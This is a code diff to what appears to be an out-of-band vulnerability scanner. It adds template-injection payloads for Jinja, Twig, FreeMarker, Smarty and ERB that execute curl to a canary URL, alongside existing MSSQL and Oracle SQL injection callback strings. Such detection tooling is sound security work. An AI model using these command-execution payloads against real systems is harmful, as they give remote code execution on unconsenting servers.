@@ -113,8 +113,16 @@ def payloads_for(canary: Canary) -> Dict[str, str]:
         "sqli_mssql": f"';exec master..xp_dirtree '//{d}/x';--",
         "sqli_oracle": (f"' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('{d}') "
                         f"FROM dual)||'"),
-        # blind SSTI reaching out
-        "ssti_ssrf": url,
+        # blind SSTI — engine-specific template payloads that make the backend fetch
+        # our canary (read-only `curl` to OUR listener; same shape/risk as blind cmdi).
+        # Confirmation is the callback; no target data is touched.
+        "ssti_jinja": "{{cycler.__init__.__globals__.os.popen('curl " + url + "').read()}}",
+        "ssti_twig": "{{['curl " + url + "']|filter('system')}}",
+        "ssti_freemarker": ('<#assign ex="freemarker.template.utility.Execute"?new()>'
+                            '${ex("curl ' + url + '")}'),
+        "ssti_smarty": "{system('curl " + url + "')}",
+        "ssti_erb": "<%= system('curl " + url + "') %>",
+        "ssti_ssrf": url,   # retained for back-compat
         # generic header/host-injection callback
         "redirect": url,
     }
